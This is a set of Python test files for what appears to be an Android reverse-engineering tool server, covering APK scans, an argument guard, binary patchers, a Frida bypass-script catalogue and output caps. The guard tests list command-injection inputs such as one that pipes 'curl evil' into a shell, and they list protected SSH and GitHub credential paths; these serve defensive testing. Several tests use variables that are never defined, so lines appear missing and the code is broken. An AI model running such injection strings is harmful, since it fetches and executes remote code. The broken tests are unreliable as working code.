def test_strings_xml_missing_and_empty(tmp_path):
    handler = _handler()
    apk = _write_apk(tmp_path, "app.apk", {"AndroidManifest.xml": b"stub"})

    no_dir = handler.android_google_services({"apk_path": apk, "smali_dir": str(tmp_path / "nope")})
    assert no_dir["status"] == "error"
    assert "smali_dir" in no_dir["error"] and "not found" in no_dir["error"]

    empty = tmp_path / "empty-decomp"
    (empty / "res" / "values").mkdir(parents=True)
    (empty / "res" / "values" / "strings.xml").write_text("<resources/>\n")
    out = handler.android_google_services({"apk_path": apk, "smali_dir": str(empty)})["output"]
    res = out["string_resources"]
    assert res["found"] == []
    assert res["note"] == "No Google-related string resources found"

    no_xml = tmp_path / "bare-decomp"
    no_xml.mkdir()
    out = handler.android_google_services({"apk_path": apk, "smali_dir": str(no_xml)})["output"]
    assert "strings.xml not found at" in out["string_resources"]["error"]


def test_arsc_scan_records_google_patterns(tmp_path):
    apk = _write_apk(tmp_path, "app.apk", {
        "AndroidManifest.xml": b"stub",
        "resources.arsc": ARSC_BLOB,
    })

    assert scan["present"] is True
    patterns = scan["patterns"]
    assert set(patterns) == {"Google API Key", "Firebase Storage Bucket", "Firebase Realtime DB URL"}
    assert patterns["Google API Key"]["risk"] == "HIGH"
    assert patterns["Google API Key"]["matches"] == [FAKE_API_KEY]
    assert patterns["Firebase Storage Bucket"]["matches"] == ["my-test-app.appspot.com"]
    assert patterns["Firebase Realtime DB URL"]["risk"] == "HIGH"
```

`python/tests/test_guard.py`:

```py
import pytest

from android_re_mcp import guard


def refused(tool, args):
    with pytest.raises(guard.GuardError):
        guard.validate(tool, args)


@pytest.mark.parametrize("target", ["x;!id", "0x0;!id", "sym.main; !curl evil|sh", "a b", "$(id)", "", "x\nid"])
def test_native_disasm_rejects_radare_syntax(target):
    refused("native_disasm", {"so_path": "/x/lib.so", "target": target})


@pytest.mark.parametrize("target", ["main", "Java_com_example_Foo_bar", "0x1f40", "_ZN3foo3barEv", "JNI_OnLoad"])
def test_native_disasm_accepts_symbols_and_offsets(target):
    assert guard.validate("native_disasm", {"so_path": "/x/lib.so", "target": target})["target"] == target


def test_path_must_not_start_with_dash():
    refused("apk_decompile", {"apk_path": "--help"})
    refused("search_strings", {"path": "-x", "pattern": "a"})


def test_path_rejects_protected_locations(isolated_env):
    refused("adb_push", {"local": str(isolated_env / ".ssh" / "id_ed25519"), "remote": "/sdcard/x"})
    refused("adb_pull", {"local": str(isolated_env / ".bashrc"), "remote": "/sdcard/x"})
    refused("adb_push", {"local": "~/.config/gh/hosts.yml", "remote": "/sdcard/x"})


def test_symlink_into_protected_location_is_refused(isolated_env, tmp_path):
    (isolated_env / ".ssh").mkdir()
    link = tmp_path / "innocent.txt"
    link.symlink_to(isolated_env / ".ssh")
    refused("adb_push", {"local": str(link), "remote": "/sdcard/x"})


def test_allowed_dirs(tmp_path, monkeypatch):
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setenv("ANDROID_RE_MCP_ALLOWED_DIRS", str(work))
    guard.validate("apk_identify", {"apk_path": str(work / "a.apk")})
```

```py
class _Resp(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def test_download_requires_matching_sha256(tmp_path, monkeypatch):
    import hashlib

    data = b"payload"
    monkeypatch.setitem(inst._PINNED, "t.jar", ("https://example.invalid/t.jar", hashlib.sha256(data).hexdigest()))
    monkeypatch.setattr(inst, "_fetch", lambda url: _Resp(data))
    dest = tmp_path / "t.jar"
    inst._download("t.jar", dest)
    assert dest.read_bytes() == data

    monkeypatch.setattr(inst, "_fetch", lambda url: _Resp(b"tampered"))
    bad = tmp_path / "bad.jar"
    with pytest.raises(inst.DownloadError):
        inst._download("t.jar", bad)
    assert not bad.exists()
    assert [p.name for p in tmp_path.iterdir() if p.name.startswith(".download-")] == []

def test_frida_script_library_ships_every_catalogue_script(isolated_env):
    """F-PY-3: the package ships its 8 scripts — the library must not be empty."""
    from android_re_mcp.frida_scripts import index

    expected = {
        "ssl_pinning_universal", "root_detection_bypass", "frida_detection_bypass",
        "crypto_monitor", "memory_scan", "method_tracer", "storage_monitor",
        "network_monitor",
    }
    assert {s["name"] for s in index.SCRIPT_CATALOGUE} == expected
    on_disk = {m["name"] for m in index.list_scripts()}
    assert on_disk == expected, f"missing on disk: {sorted(expected - on_disk)}"
    for meta in index.list_scripts():
        content = index.get_script_content(meta["name"])
        assert content and content.strip(), meta["name"]


def test_user_script_override_precedence(isolated_env):
    from android_re_mcp.frida_scripts import index

    d = isolated_env / ".local" / "share" / "android-re-mcp" / "frida_scripts"
    d.mkdir(parents=True)
    (d / "crypto_monitor.js").write_text("// mine")
    assert index.get_script_content("crypto_monitor") == "// mine"  # override wins
    # ...but every other script still resolves to the shipped library
    assert index.get_script_content("ssl_pinning_universal") is not None
    assert "// mine" not in index.get_script_content("memory_scan")


def test_shipped_scripts_register_and_rearm_the_config_protocol():
    """Every script accepts {type:'config', ...}: UPPER primary, lowercase fallback."""
    from android_re_mcp.frida_scripts import index

    for meta in index.SCRIPT_CATALOGUE:
        src = index.get_script_content(meta["name"])
        # one registration + one re-arm inside the handler
        assert src.count('recv("config"') >= 2, meta["name"]
        assert "function _onConfig" in src, meta["name"]


def test_shipped_scripts_use_only_frida_17_globals():
    """D-5: the bare `process` global is gone in frida 17 (QuickJS).

    memory_scan called `process.enumerateRanges("rw-")`, which turned
    every scan into `ReferenceError: 'process' is not defined` at
    runtime — `node --check` cannot catch missing script globals, so the
    guard is a source-level scan for the lowercase pre-QuickJS names.
    """
    import re

    from android_re_mcp.frida_scripts import index

    bare = re.compile(
        r"(?<![.\w])process\.(enumerateRanges|enumerateModules|enumerateThreads|"
        r"enumerateMallocRanges|getModuleByName|findModuleByName|"
        r"isDebuggerPaused|setExceptionHandler)\b"
    )
    for meta in index.SCRIPT_CATALOGUE:
        src = index.get_script_content(meta["name"])
        assert not bare.search(src), (
            f"{meta['name']} uses the pre-frida-17 bare `process` global"
        )


def test_java_scripts_are_bundled_with_the_java_bridge():
    """D-9: frida 17 removed the `Java` global from script runtimes.

    The seven Java-hooking scripts therefore ship as frida-compile
    bundles with frida-java-bridge compiled in (see build_bundles.sh);
    a raw source using the classic `Java.perform` global would die with
    `ReferenceError: 'Java' is not defined` on every modern client.
    memory_scan is pure-native and ships as raw source.
    """
    from android_re_mcp.frida_scripts import index

    for meta in index.SCRIPT_CATALOGUE:
        src = index.get_script_content(meta["name"])
        if meta["name"] == "memory_scan":
            continue
        assert "frida-java-bridge" in src, (
            f"{meta['name']} must ship as a bundle with frida-java-bridge "
            "compiled in (frida 17 has no Java global)"
        )


def test_memory_scan_contract_for_frida_find_bytes():
    """frida_find_bytes str.replace-patches these exact lines — they must exist."""
    from android_re_mcp.frida_scripts import index

    src = index.get_script_content("memory_scan")
    assert 'var SEARCH_STRING = "";' in src
    assert 'var SEARCH_HEX = "";' in src
    assert 'var MAX_RESULTS = 50;' in src
    # ...and produces the message shapes the handler consumes
    # (pretty-printed across lines: `type: "match",` then `match: {`)
    assert 'type: "match",' in src and "match: {" in src
    assert 'type: "scan_complete"' in src
    # method_tracer's handler contract
    tracer = index.get_script_content("method_tracer")
    assert 'type: "method_trace"' in tracer
```

```py
"""Tests for the MT-MCP adoption batch (mt-mcp-android-re-implementation-plan).

Tier-1 zip/signature/native-map tests are hermetic with synthetic fixtures;
keystone tests skip without the engine; jar-gated dex outline tests skip
without dexfile-cli; androguard resource tests skip without androguard —
matching the plan's dependency expectations.
"""

import hashlib
import os
import shutil
import zipfile
from pathlib import Path

import pytest

from android_re_mcp.handlers import apkops as apkops_mod
from android_re_mcp.handlers.apkops import ApkOpsHandler
from android_re_mcp.handlers.dex import DexHandler

try:
    import keystone  # noqa: F401
except ImportError:  # pragma: no cover - exercised only without the extra
    keystone = None

try:
    import androguard  # noqa: F401
except ImportError:  # pragma: no cover - exercised only without the extra
    androguard = None

requires_keystone = pytest.mark.skipif(
    keystone is None, reason="keystone-engine not installed"
)
requires_androguard = pytest.mark.skipif(
    androguard is None, reason="androguard not installed"
)

FIXTURE_APK = str(Path(__file__).parent / "fixtures" / "notesdemo.apk")

JAR_OK = (apkops_mod.tools_dir() / "dexfile-cli.jar").is_file()
ROUNDTRIP = pytest.mark.skipif(not JAR_OK, reason="dexfile-cli.jar not available")


# ── apk_read_signature ────────────────────────────────────────────────────

def test_read_signature_on_real_apk():

    assert result["status"] == "ok"
    out = result["output"]
    assert out["ok"] is True
    assert "verifies" in out
    if out.get("schemes"):  # apksigner present on PATH
        assert isinstance(out["schemes"], dict)


def test_read_signature_on_unsigned_zip(tmp_path):
    unsigned = tmp_path / "unsigned.zip"
    with zipfile.ZipFile(unsigned, "w") as z:
        z.writestr("AndroidManifest.xml", "<manifest/>")
    result = ApkOpsHandler().apk_read_signature({"apk_path": str(unsigned)})
    out = result["output"]
    assert out["ok"] is True
    assert out.get("verifies") is False or "signers" not in out or not out["signers"]


# ── zip_update ────────────────────────────────────────────────────────────

def _three_entry_zip(tmp_path: Path) -> Path:
    apk = tmp_path / "app.apk"
    with zipfile.ZipFile(apk, "w") as z:
        z.writestr("AndroidManifest.xml", "<manifest/>")
        z.writestr("classes.dex", b"dex\n035\x00payload-here")
        z.writestr("res/values/strings.xml", "<resources/>")
    return apk


def test_zip_update_patch_preserves_other_entries(tmp_path):
    apk = _three_entry_zip(tmp_path)
    before = {n: zipfile.ZipFile(apk).read(n) for n in zipfile.ZipFile(apk).namelist()}
    ops = [{"op": "patch", "entry_path": "classes.dex", "byte_offset": 12,
            "expected_hex": before["classes.dex"][12:20].hex(),
            "replacement_hex": "ffffffff"}]
    result = ApkOpsHandler().zip_update({"apk_path": str(apk), "ops": ops})
    assert result["status"] == "ok"
    after = {n: zipfile.ZipFile(apk).read(n) for n in zipfile.ZipFile(apk).namelist()}
    assert after["classes.dex"][:12] + b"\xff" * 4 + after["classes.dex"][20:] == \
        before["classes.dex"][:12] + b"\xff" * 4 + before["classes.dex"][20:]
    assert after["AndroidManifest.xml"] == before["AndroidManifest.xml"]  # byte-identical
    assert hashlib.sha256(after["res/values/strings.xml"]).hexdigest() == \
        hashlib.sha256(before["res/values/strings.xml"]).hexdigest()  # untouched = identical
    # compression type preserved for untouched entries
    infos = {i.filename: i for i in zipfile.ZipFile(apk).infolist()}
    assert infos["AndroidManifest.xml"].compress_type == \
        zipfile.ZipFile(str(apk)).getinfo("AndroidManifest.xml").compress_type


def test_zip_update_patch_expected_mismatch_aborts(tmp_path):
    apk = _three_entry_zip(tmp_path)
    ops = [{"op": "patch", "entry_path": "classes.dex", "byte_offset": 12,
            "expected_hex": "deadbeef", "replacement_hex": "ffffffff"}]
    result = ApkOpsHandler().zip_update({"apk_path": str(apk), "ops": ops})
    assert result["status"] == "ok"  # the batch reports; the op failed
    assert result["output"]["errors"] and "mismatch" in result["output"]["errors"][0]["error"]
    # untouched entries are byte-identical: the patch was not applied
    assert zipfile.ZipFile(apk).read("classes.dex").startswith(b"dex\n035\x00payload")


def test_zip_update_rename_meta_inf_refused(tmp_path):
    apk = _three_entry_zip(tmp_path)
    ops = [{"op": "rename", "from": "res/values/strings.xml", "to": "META-INF/evil.xml"}]
    result = ApkOpsHandler().zip_update({"apk_path": str(apk), "ops": ops})
    errors = result["output"]["errors"]
    assert errors and "signatures" in errors[0]["error"]


def test_zip_update_add_replace_delete(tmp_path):
    apk = _three_entry_zip(tmp_path)
    new_file = tmp_path / "extra.bin"
    new_file.write_bytes(b"added-bytes")
    ops = [
        {"op": "add", "entry_path": "assets/extra.bin", "from_file": str(new_file)},
        {"op": "replace", "entry_path": "res/values/strings.xml", "content": "<resources x/>"},
        {"op": "delete", "entry_path": "classes.dex"},
    ]
    result = ApkOpsHandler().zip_update({"apk_path": str(apk), "ops": ops})
    assert result["status"] == "ok"
    with zipfile.ZipFile(apk) as z:
        names = z.namelist()
        assert "assets/extra.bin" in names and "classes.dex" not in names
        assert z.read("assets/extra.bin") == b"added-bytes"
        assert z.read("res/values/strings.xml") == b"<resources x/>"


def test_zip_update_expected_sha_guard(tmp_path):
    apk = _three_entry_zip(tmp_path)
    result = ApkOpsHandler().zip_update({
        "apk_path": str(apk),
        "ops": [{"op": "delete", "entry_path": "classes.dex"}],
        "expected_sha256": "0" * 64,
    })
    assert result["status"] == "error" and "mismatch" in result["error"]


# ── zip_test ──────────────────────────────────────────────────────────────

def test_zip_test_counts_and_clean_zip(tmp_path):

    out = ApkOpsHandler().zip_test({"zip_path": str(apk)})["output"]
    assert out["ok"] is True and out["entries"] == 3
    assert out["bad"] == [] and out["duplicates"] == []
    assert out["methods"].get("store") == 3  # writestr(str) defaults to STORED


def test_zip_test_flags_duplicates_and_corrupt(tmp_path):
    corrupt = tmp_path / "corrupt.zip"
    with zipfile.ZipFile(corrupt, "w") as z:
        z.writestr("a.txt", "aaaa")
        z.writestr("a.txt", "bbbb")  # duplicate name
        z.writestr("b.txt", "cccc")
    raw = corrupt.read_bytes()
    # corrupt b.txt's compressed data inside the file (flip a byte mid-archive)
    idx = raw.index(b"cccc")
    raw = raw[:idx + 2] + b"XX" + raw[idx + 4:]
    corrupt.write_bytes(raw)
    out = ApkOpsHandler().zip_test({"zip_path": str(corrupt)})["output"]
    assert out["duplicates"] == ["a.txt"]
    assert out["ok"] is False
    assert out["bad"] and "b.txt" in out["bad"][0]["name"]

    out = ApkOpsHandler().zip_test({"apk_path": FIXTURE_APK})["output"]
    assert out["ok"] is True and out["entries"] >= 3

# ── native_map_address / native patchers ──────────────────────────────────

def _phdr_so(tmp_path: Path, code: bytes, vaddr: int = 0x1000) -> Path:
    """Minimal ELF64/AArch64 with one PT_LOAD carrying `code` at vaddr."""
    from test_sosec import _elf64_phdr

    blob = _elf64_phdr([(1, 0x5, code)])  # PT_LOAD, R+X
    # patch e_machine to AArch64 (the builder defaults to it)
    return _write(tmp_path, blob)


def _write(tmp_path: Path, blob: bytes) -> Path:
    p = tmp_path / "libtest.so"
    p.write_bytes(blob)
    return p


def test_native_map_address_both_directions(tmp_path):
    # the phdr fixture maps vaddr 0x100040 -> file offset 0x40 (0x100000 + off)
    code = b"\x1f\x20\x03\xd5" * 4
    so = _phdr_so(tmp_path, code)
    from android_re_mcp.handlers.sosec import SoSecHandler
    out = SoSecHandler().native_map_address({"so_path": str(so), "address": "0x100044"})["output"]
    assert out["file_offset"] == "0x44"
    assert out["mapped_in_exec"] is True
    back = SoSecHandler().native_map_address({"so_path": str(so), "address": "0x44",
                                              "address_kind": "file_offset"})["output"]
    assert back["va"] == "0x100044"


def test_native_map_address_unmapped_is_honest(tmp_path):
    code = b"\x1f\x20\x03\xd5" * 2
    so = _phdr_so(tmp_path, code)
    del code
    from android_re_mcp.handlers.sosec import SoSecHandler
    result = SoSecHandler().native_map_address({"so_path": str(so), "address": "0xdead0000"})
    assert result["status"] == "error" and "not mapped" in result["error"]


def test_native_patch_string_shortens_and_zero_pads(tmp_path):
    code = b"\x1f\x20\x03\xd5" + b"hello-original\x00" + b"\x1f\x20\x03\xd5"
    so = _phdr_so(tmp_path, code)
    del code
    from android_re_mcp.handlers.sosec import SoSecHandler
    result = SoSecHandler().native_patch_string({
        "so_path": str(so), "expected_text": "hello-original",
        "replacement_text": "hi", "output_path": str(so)})
    assert result["status"] == "ok"
    data = so.read_bytes()
    assert b"hi\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" in data
    assert b"hello-original" not in data
    site = result["output"]["sites"][0]
    assert site["bytes_written"] == len("hello-original")


def test_native_patch_string_too_long_rejected(tmp_path):
    code = b"\x1f\x20\x03\xd5" + b"short\x00"
    so = _phdr_so(tmp_path, code)
    del code
    from android_re_mcp.handlers.sosec import SoSecHandler
    before = so.read_bytes()
    result = SoSecHandler().native_patch_string({
        "so_path": str(so), "expected_text": "short",
        "replacement_text": "much-longer-replacement"})
    assert result["status"] == "error" and "shorter only" in result["error"]
    assert so.read_bytes() == before  # zero writes on abort


def test_native_patch_string_expected_missing_aborts(tmp_path):
    code = b"\x1f\x20\x03\xd5" + b"short\x00"
    so = _phdr_so(tmp_path, code)
    del code
    from android_re_mcp.handlers.sosec import SoSecHandler
    before = so.read_bytes()
    result = SoSecHandler().native_patch_string({
        "so_path": str(so), "expected_text": "absent-string",
        "replacement_text": "x"})
    assert result["status"] == "error" and "not found" in result["error"]
    assert so.read_bytes() == before


@requires_keystone
def test_native_patch_instructions_arm64(tmp_path):
    code = b"\x00\x00\x80\xd2" * 2  # movz x0, #0 twice (4 bytes each)
    so = _phdr_so(tmp_path, code)
    from android_re_mcp.handlers.sosec import SoSecHandler
    result = SoSecHandler().native_patch_instructions({
        "so_path": str(so), "address": "0x100040",
        "expected_hex": code[:4].hex(),
        "replacement_assembly": "mov x0, #1", "output_path": str(so)})
    assert result["status"] == "ok"
    data = so.read_bytes()
    assert data[0x40:0x44] == bytes.fromhex("20 00 80 d2".replace(" ", ""))  # MOVZ X0,#1 = 0xd2800020
    assert data[0x44:0x48] == code[4:8]  # second instruction untouched
    report = result["output"]
    assert report["bytes_written"] == 4 and report["assembled_bytes"] == 4


@requires_keystone
def test_native_patch_instructions_expected_mismatch(tmp_path):
    code = b"\xd2\x80\x00\x00" * 2
    so = _phdr_so(tmp_path, code)
    del code
    before = so.read_bytes()
    from android_re_mcp.handlers.sosec import SoSecHandler
    result = SoSecHandler().native_patch_instructions({
        "so_path": str(so), "address": "0x100040",
        "expected_hex": "aabbccdd", "replacement_assembly": "mov x0, #1"})
    assert result["status"] == "error" and "mismatch" in result["error"]
    assert so.read_bytes() == before


@requires_keystone
def test_native_patch_instructions_too_long_rejected(tmp_path):
    code = b"\x1f\x20\x03\xd5"  # one 4-byte NOP
    so = _phdr_so(tmp_path, code)
    del code
    before = so.read_bytes()
    from android_re_mcp.handlers.sosec import SoSecHandler
    result = SoSecHandler().native_patch_instructions({
        "so_path": str(so), "address": "0x100040",
        "expected_hex": "1f2003d5",
        "replacement_assembly": "mov x0, #1\nmov x1, #2\nmov x2, #3"})
    assert result["status"] == "error" and "shorter only" in result["error"]
    assert so.read_bytes() == before
```

`python/tests/test_native_inventory.py`:

```py
"""Hermetic tests for the E-PY-14 native-library fold-in.

The npm android_native_libraries machinery (known-lib table, ELF header
inspection, per-ABI inventory) now lives in handlers/native.py and rides
along in rasp_identify. ELF fixtures are crafted by hand — no real .so
files needed.
"""

import zipfile
from pathlib import Path

from android_re_mcp.handlers.native import (
    _KNOWN_ANDROID_LIBS,
    apk_native_inventory,
    inspect_elf,
    match_known_lib,
)

EM_AARCH64 = 183
ET_DYN = 3


def _elf64(section_names: list[str], stripped: bool = False) -> bytes:
    """Craft a minimal 64-bit little-endian ARM64 ELF (DYN) by hand."""
    header = bytearray(0x40)
    header[:4] = b"\x7fELF"
    header[4] = 2  # ELFCLASS64
    header[5] = 1  # little-endian
    header[0x10:0x12] = ET_DYN.to_bytes(2, "little")
    header[0x12:0x14] = EM_AARCH64.to_bytes(2, "little")
    if stripped:
        # shoff (0x28) and shnum (0x3c) stay zero
        return bytes(header)

    shnum = len(section_names) + 2  # NULL + .shstrtab + named sections
    shentsize = 0x40
    shoff = 0x40
    strtab = bytearray(b"\x00.shstrtab\x00")
    name_offsets: dict[str, int] = {}
    for name in section_names:
        name_offsets[name] = len(strtab)
        strtab += name.encode() + b"\x00"
    strtab_off = shoff + shnum * shentsize

    buf = bytearray(strtab_off + len(strtab))
    buf[:0x40] = header
    buf[0x28:0x30] = shoff.to_bytes(8, "little")
    buf[0x3A:0x3C] = shentsize.to_bytes(2, "little")
    buf[0x3C:0x3E] = shnum.to_bytes(2, "little")
    buf[0x3E:0x40] = (1).to_bytes(2, "little")  # shstrndx = 1 (.shstrtab)

    def shdr(index: int, name_off: int, sh_type: int, off: int = 0, size: int = 0) -> None:
        base = shoff + index * shentsize
        buf[base:base + 4] = name_off.to_bytes(4, "little")
        buf[base + 4:base + 8] = sh_type.to_bytes(4, "little")
        buf[base + 0x18:base + 0x20] = off.to_bytes(8, "little")
        buf[base + 0x20:base + 0x28] = size.to_bytes(8, "little")

    shdr(0, 0, 0)                              # SHT_NULL
    shdr(1, 1, 3, strtab_off, len(strtab))     # .shstrtab (STRTAB); its name sits at strtab offset 1
    for j, name in enumerate(section_names):
        shdr(2 + j, name_offsets[name], 1)     # PROGBITS
    buf[strtab_off:strtab_off + len(strtab)] = strtab
    return bytes(buf)


def _write_apk(tmp_path: Path, name: str, files: dict[str, bytes]) -> str:
    apk_path = tmp_path / name
    with zipfile.ZipFile(apk_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for fname, data in files.items():
            zf.writestr(fname, data)
    return str(apk_path)


def test_inspect_elf_parses_section_names():
    elf = inspect_elf(_elf64([".text", ".rodata", ".data"]))
    assert elf["ok"] is True
    assert elf["machine"] == "ARM64"
    assert "64-bit ARM64, DYN (shared object)" in elf["detail"]
    assert elf["shnum"] == 5  # NULL + .shstrtab + 3 named
    assert set(elf["sections"]) == {".shstrtab", ".text", ".rodata", ".data"}


def test_inspect_elf_stripped_and_32bit():
    stripped = inspect_elf(_elf64([], stripped=True))
    assert stripped["ok"] is True
    assert stripped["shnum"] == 0
    assert stripped["note"] == (
        "no section-header table (stripped or packed — common for packer/RASP payloads)"
    )

    # 32-bit variant: shoff/shnum/shstrndx at the ELF32 offsets
    buf = bytearray(0x34)
    buf[:4] = b"\x7fELF"
    buf[4] = 1  # ELFCLASS32
    buf[5] = 1
    buf[0x10:0x12] = (3).to_bytes(2, "little")
    buf[0x12:0x14] = (40).to_bytes(2, "little")  # EM_ARM
    elf32 = inspect_elf(bytes(buf))
    assert elf32["ok"] is True
    assert "32-bit ARM" in elf32["detail"]


def test_inspect_elf_degrades_without_throwing():
    assert inspect_elf(b"not an elf at all, just bytes")["ok"] is False
    assert "missing" in inspect_elf(b"\x00\x01\x02\x03")["detail"]

    # valid magic + class but truncated below the fixed header size
    truncated = bytearray(0x34)
    truncated[:4] = b"\x7fELF"
    truncated[4] = 2
    truncated[5] = 1
    out = inspect_elf(bytes(truncated))
    assert out["ok"] is False
    assert "truncated" in out["detail"]

    # big-endian ELF is rejected with the npm wording
    be = bytearray(b"\x7fELF" + bytes(0x40))
    be[4], be[5] = 2, 2
    assert "big-endian" in inspect_elf(bytes(be))["detail"]


def test_known_lib_table_matches_npm():
    """Pattern rows, labels and kinds ported verbatim from the npm table."""
    assert len(_KNOWN_ANDROID_LIBS) == 31
    cases = {
        "libjiagu_x86.so": ("Qihoo 360 Jiagu (加固)", "packer"),
        "libDexHelper.so": ("SecNeo", "packer"),
        "libSecShell-x86.so": ("Bangcle (梆梆安全)", "packer"),
        "libDexProtector.so": ("DexProtector", "packer"),
        "libAppGuard.so": ("AppGuard (INKA Entworks)", "rasp"),
        "libsgmainso-6.4.43.so": ("Alibaba SecurityGuard (聚安全)", "rasp"),
        "libflutter.so": ("Flutter engine", "framework"),
        "libunity.so": ("Unity engine", "framework"),
        "libil2cpp.so": ("Unity IL2CPP", "framework"),
        "libBugly.so": ("Tencent Bugly (crash reporting)", "sdk"),
        "libc++_shared.so": ("NDK libc++ runtime", "runtime"),
        "libhoudini.so": ("Intel ARM translation layer", "runtime"),
    }
    for basename, (label, kind) in cases.items():
        got = match_known_lib(basename)
        assert got == {"label": label, "kind": kind}, basename
    # npm's per-row case-insensitivity is preserved (only where npm set /i)
    assert match_known_lib("LIBJIAGU.so")["label"] == "Qihoo 360 Jiagu (加固)"
    assert match_known_lib("libvplayer.so") is None  # unrecognised


def test_apk_native_inventory_end_to_end(tmp_path):
    good = _elf64([".text", ".rodata"])
    stripped = _elf64([], stripped=True)
    apk = _write_apk(tmp_path, "app.apk", {
        "AndroidManifest.xml": b"stub",
        "classes.dex": b"dex",
        "lib/arm64-v8a/libflutter.so": good,
        "lib/armeabi-v7a/libjiaguv3.so": stripped,
        "lib/x86/libvendor_unknown.so": b"\x7fELF-garbage-not-really",
        "res/layout/main.xml": b"<layout/>",
    })
    inv = apk_native_inventory(apk)
    assert inv["no_native_code"] is False
    assert list(inv["by_abi"]) == ["arm64-v8a", "armeabi-v7a", "x86"]

    flutter = inv["by_abi"]["arm64-v8a"][0]
    assert flutter["identified"] == {"label": "Flutter engine", "kind": "framework"}
    assert flutter["elf"]["machine"] == "ARM64"

    jiagu = inv["by_abi"]["armeabi-v7a"][0]
    assert jiagu["identified"]["kind"] == "packer"
    assert jiagu["elf"]["note"] and "no section-header table" in jiagu["elf"]["note"]

    unknown = inv["by_abi"]["x86"][0]
    assert unknown["identified"] is None
    assert unknown["elf"]["ok"] is False  # truncated garbage → degraded, not thrown

    # packer hit (with the ELF note) and only that one → protection signals
    assert inv["protection_signals"] == [
        "libjiaguv3.so: Qihoo 360 Jiagu (加固) (packer) — "
        "no section-header table (stripped or packed — common for packer/RASP payloads)"
    ]
    s = inv["summary"]
    assert (s["total"], s["abis"], s["identified"]) == (3, 3, 2)
    assert (s["packer"], s["framework"], s["rasp"], s["sdk"], s["runtime"]) == (1, 1, 0, 0, 0)


def test_apk_native_inventory_empty_and_missing(tmp_path, monkeypatch):
    monkeypatch.setattr("shutil.which", lambda *_a, **_k: None)
    apk = _write_apk(tmp_path, "plain.apk", {"AndroidManifest.xml": b"stub", "classes.dex": b"dex"})

    assert inv["no_native_code"] is True
    assert inv["note"] == "No lib/<abi>/*.so entries — the APK ships no native code."
    assert inv["protection_signals"] == [] and inv["summary"]["total"] == 0

    bad = apk_native_inventory(str(tmp_path / "missing.apk"))
    assert "error" in bad and "not found" in bad["error"] or "No such file" in bad["error"]


def test_rasp_identify_folds_in_native_inventory(tmp_path, monkeypatch):

    monkeypatch.setattr("shutil.which", lambda *_a, **_k: None)  # skip the apkid strategy
```

`python/tests/test_output_caps.py`:

```py
"""Hermetic tests for the E-PY-15 token-conservation caps.

The strategy is android-unidbg-mcp's: cap heavy list outputs, keep the
honest total, and end with an actionable narrowing hint — one tool call
must never flood the assistant's context window. Every handler wired to
handlers/caps.py is exercised here with fake queues and fake subprocess
output — no adb, no frida, no ripgrep.
"""

import json

import pytest

from android_re_mcp.handlers.caps import DEFAULT_MAX_OUTPUT_LINES, cap_items, output_cap


@pytest.fixture
def default_cap(monkeypatch):
    monkeypatch.delenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", raising=False)


# ── caps module ───────────────────────────────────────────────────────────

def test_output_cap_default_and_env_overrides(monkeypatch):
    monkeypatch.delenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", raising=False)
    assert output_cap() == DEFAULT_MAX_OUTPUT_LINES == 200
    monkeypatch.setenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", "50")
    assert output_cap() == 50
    monkeypatch.setenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", "0")
    assert output_cap() == 0  # 0 disables capping
    monkeypatch.setenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", "-5")
    assert output_cap() == 0  # negative clamps to disabled
    monkeypatch.setenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", "junk")
    assert output_cap() == 200  # junk falls back to the default


def test_cap_items_under_cap_keeps_exact_shape():
    shown, info = cap_items(["a", "b"], "narrow it")
    assert shown == ["a", "b"]
    assert info == {"total": 2, "shown": 2, "truncated": False}


def test_cap_items_truncates_with_counts_and_hint(monkeypatch):
    monkeypatch.setenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", "3")
    items = [f"line{i}" for i in range(5)]
    shown, info = cap_items(items, "use the filter")
    assert len(shown) == 3
    assert info["total"] == 5
    assert info["shown"] == 3
    assert info["truncated"] is True
    assert "2 more omitted" in info["hint"]
    assert "use the filter" in info["hint"]


def test_cap_items_zero_cap_disables_truncation(monkeypatch):
    monkeypatch.setenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", "0")
    items = list(range(300))
    shown, info = cap_items(items, "hint")
    assert shown is items
    assert info["truncated"] is False


# ── frida_read_output ─────────────────────────────────────────────────────

from android_re_mcp.handlers.dynamic import DynamicHandler  # noqa: E402


def _fill_frida(h: DynamicHandler, n: int) -> None:
    for i in range(n):
        h._output_queue.put(f"m{i}")


def test_frida_read_output_caps_and_keeps_remainder_buffered(default_cap):
    h = DynamicHandler()
    _fill_frida(h, 250)
    out = h.frida_read_output({})["output"]
    assert out["count"] == 200
    assert len(out["messages"]) == 200
    assert out["truncated"] is True
    assert out["buffered"] == 50
    assert "frida_read_output" in out["hint"]

    second = h.frida_read_output({})["output"]
    assert second["count"] == 50  # the held-back lines survive for this call
    assert "truncated" not in second

    third = h.frida_read_output({})["output"]
    assert third["count"] == 0
    assert "truncated" not in third


def test_frida_detach_drops_held_back_lines(default_cap):
    h = DynamicHandler()
    _fill_frida(h, 210)
    h.frida_read_output({})
    assert h._pending_output  # 10 lines held back
    h._frida_session = object()  # pretend attached
    assert h.frida_detach({})["output"]["detached"] is True
    assert h._pending_output == []  # they die with the session
    assert h.frida_read_output({})["output"]["count"] == 0


def test_frida_read_output_zero_cap_drains_everything(monkeypatch):
    monkeypatch.setenv("ANDROID_RE_MCP_MAX_OUTPUT_LINES", "0")
    h = DynamicHandler()
    _fill_frida(h, 250)
    out = h.frida_read_output({})["output"]
    assert out["count"] == 250
    assert "truncated" not in out
    assert h._pending_output == []


# ── adb_logcat_read / adb_logcat_stop ─────────────────────────────────────

from android_re_mcp.handlers.device import DeviceHandler  # noqa: E402


def _fill_logcat(h: DeviceHandler, n: int) -> None:
    for i in range(n):
        h._logcat_queue.put(f"L{i}")


def test_logcat_read_clamps_oversized_requests(default_cap):
    h = DeviceHandler()
    _fill_logcat(h, 300)
    out = h.adb_logcat_read({"lines": 300})["output"]
    assert out["count"] == 200
    assert out["truncated"] is True
    assert out["buffered"] == 100
    assert "adb_logcat_start filter" in out["hint"]


